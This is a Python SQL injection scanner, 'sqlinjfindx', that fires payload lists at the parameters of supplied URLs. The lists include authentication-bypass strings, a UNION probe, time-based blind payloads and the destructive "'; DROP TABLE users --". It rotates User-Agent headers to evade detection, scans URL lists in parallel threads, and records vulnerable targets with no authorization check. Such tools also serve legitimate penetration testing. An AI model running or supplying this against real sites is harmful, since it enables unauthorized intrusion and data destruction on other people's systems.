import requests
import argparse
import re
import random
import logging
import threading
import json
import csv
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from tqdm import tqdm

# SQL Injection payloads to test
sql_payloads = [
    "' OR '1'='1", 
    "' OR '1'='1' --", 
    "' OR 1=1--", 
    '" OR "1"="1',
    '1 OR 1=1',
    "' AND 1=2 UNION SELECT null,null,null --",
    "admin' --",
    "'; DROP TABLE users --",
    "' OR 'x'='x",
]

# Time-based blind SQL payloads
blind_sql_payloads = [
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SLEEP(5) --",
    '"; SLEEP(5) --',
    "' OR IF(1=1,SLEEP(5),0)--",
]

# List of common User-Agents to avoid basic detection
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
]

# Configure logging
logging.basicConfig(filename="sqlinjfindx.log", level=logging.INFO, 
                    format="%(asctime)s - %(message)s", filemode="w")

def print_banner():
    banner = r'''
    ========================================
    sqlinjfindx - SQL Injection Scanner v1.5
            --by root0emir--

             _  _           _   __  _             _       
            | |(_)         (_) / _|(_)           | |      
 ___   __ _ | | _  _ __     _ | |_  _  _ __    __| |__  __
/ __| / _` || || || '_ \   | ||  _|| || '_ \  / _` |\ \/ /
\__ \| (_| || || || | | |  | || |  | || | | || (_| | >  < 
|___/ \__, ||_||_||_| |_|  | ||_|  |_||_| |_| \__,_|/_/\_\
         | |              _/ |                            
         |_|             |__/                             
    ========================================
    '''
    print(colored(banner, 'green'))

# Scan for SQL Injection vulnerabilities
def scan_for_sql_injection(url, method, params, headers, blind=False, verbose=0):
    vulnerable = False
    headers['User-Agent'] = random.choice(user_agents)
    payloads = blind_sql_payloads if blind else sql_payloads

    for payload in tqdm(payloads, desc="Testing payloads"):
        test_params = {key: f"{value}{payload}" for key, value in params.items()}
        try:
            if method == "GET":
                response = requests.get(url, params=test_params, headers=headers, timeout=5)
            else:
                response = requests.post(url, data=test_params, headers=headers, timeout=5)
            
            if verbose >= 1:
                print(f"Testing {url} with payload: {payload}")
                print(f"Status Code: {response.status_code}")
                print(f"Response Time: {response.elapsed.total_seconds()} seconds")
            
            # Check for SQL errors or long delays for blind SQLi
            if re.search(r"(sql syntax|mysql_fetch_array|ORA-01756|error in your SQL syntax|invalid query)", 
                         response.text, re.I) or (blind and response.elapsed.total_seconds() >= 5):
                print(colored(f"[!] SQL Injection vulnerability found with payload: {payload}", 'red'))
                logging.info(f"Vulnerable URL: {url} | Payload: {payload}")
                vulnerable = True
                break
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Request failed: {e}", 'yellow'))
            logging.error(f"Request failed for {url}: {e}")
    return vulnerable

# Parse query string for GET parameters
def parse_query_string(query):
    params = {}
    if "?" in query:
        query = query.split("?")[1]
    for pair in query.split("&"):
        key, value = pair.split("=")
        params[key] = value
    return params

# Worker function to handle scanning of each URL
def worker(url, method, params, headers, blind, verbose, output_file):
    print(f"Scanning URL: {url} with parameters {params}")
    is_vulnerable = scan_for_sql_injection(url, method, params, headers, blind, verbose)

    if is_vulnerable:
        result = {"url": url, "params": params}
        save_result(output_file, result)
        print(colored(f"- Vulnerability saved to {output_file}", 'green') if output_file else colored("- Vulnerability displayed on screen", 'green'))

import threading

# Create a global lock for file operations
file_lock = threading.Lock()

# Save the results to output file
def save_result(output_file, result):
    if output_file:
        with file_lock:  # Ensure only one thread writes at a time
            if output_file.endswith(".json"):
                # Append the result to a JSON file
                try:
                    with open(output_file, "a") as f:
                        json.dump(result, f, indent=4)  # Proper formatting for JSON
                        f.write("\n")  # Ensure a new line after each JSON object
                except Exception as e:
                    print(colored(f"[!] Error saving to JSON: {e}", 'red'))

            elif output_file.endswith(".csv"):
                # Append the result to a CSV file
                try:
                    with open(output_file, "a", newline='') as f:
                        writer = csv.writer(f)
                        if f.tell() == 0:  # If file is empty, write headers first
                            writer.writerow(result.keys())
                        writer.writerow(result.values())
                except Exception as e:
                    print(colored(f"[!] Error saving to CSV: {e}", 'red'))

            else:
                # For plain text (.txt) or any other format
                try:
                    with open(output_file, "a") as f:
                        f.write(f"{result}\n")  # Append each result as a new line
                except Exception as e:
                    print(colored(f"[!] Error saving to text file: {e}", 'red'))
    else:
        # If no output file is provided, just print the result to the screen
        print(colored(f"Result:\n{result}", 'green'))



# Handle the interactive mode
def interactive_menu():
    print(colored("Welcome to sqlinjfindx Interactive Mode", "cyan"))
    url = input("Enter the URL to scan: ")
    method = input("Choose method (GET/POST): ").upper()
    blind_sql = input("Perform Blind SQL Injection Scan? (y/n): ").lower() == 'y'
    output_file = input("Enter output file path (e.g., output.txt, report.json, findings.csv): ")
    threads = input("Number of threads to use (1-10): ")
    verbose_mode = input("Enable verbose mode? (y/n): ").lower() == 'y'
    
    # Start the scan based on user inputs
    headers = {}
    worker(url, method, parse_query_string(url), headers, blind_sql, verbose_mode, output_file)

# Main program
if __name__ == "__main__":
    # Print the banner
    print_banner()

    parser = argparse.ArgumentParser(description="sqlinjfindx - Enhanced SQL Injection Vulnerability Scanner")
    parser.add_argument("url", help="Target URL with parameters (e.g., http://example.com/page?id=1) or a file with URLs")
    parser.add_argument("-o", "--output", help="File to save results (supports .txt, .json, or .csv)", default=None)
    parser.add_argument("-m", "--method", help="HTTP method (GET or POST)", default="GET", choices=["GET", "POST"])
    parser.add_argument("-t", "--timeout", help="Request timeout in seconds", default=5, type=int)
    parser.add_argument("-H", "--header", help="Custom header(s) in key=value format (e.g., Authorization=Bearer token123)", action='append')
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="count", default=0)
    parser.add_argument("-b", "--blind", help="Enable Blind SQL Injection scanning", action="store_true")
    parser.add_argument("-T", "--threads", help="Number of threads to use for scanning multiple URLs", default=1, type=int)
    parser.add_argument("-i", "--interactive", help="Start in interactive mode", action="store_true")
    args = parser.parse_args()

    if args.interactive:
        interactive_menu()
    else:
        headers = {}
        if args.header:
            for h in args.header:
                k, v = h.split("=", 1)
                headers[k] = v
        
        url_list = []
        
        # Support multiple URLs if passed in a file
        if args.url.endswith(".txt"):
            with open(args.url, "r") as f:
                url_list = f.read().splitlines()
        else:
            url_list = [args.url]
        
        # Use ThreadPoolExecutor for parallel scans
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for url in url_list:
                params = parse_query_string(url)
                executor.submit(worker, url, args.method, params, headers, args.blind, args.verbose, args.output)

        print(colored("*** Scanning completed ***", 'green'))
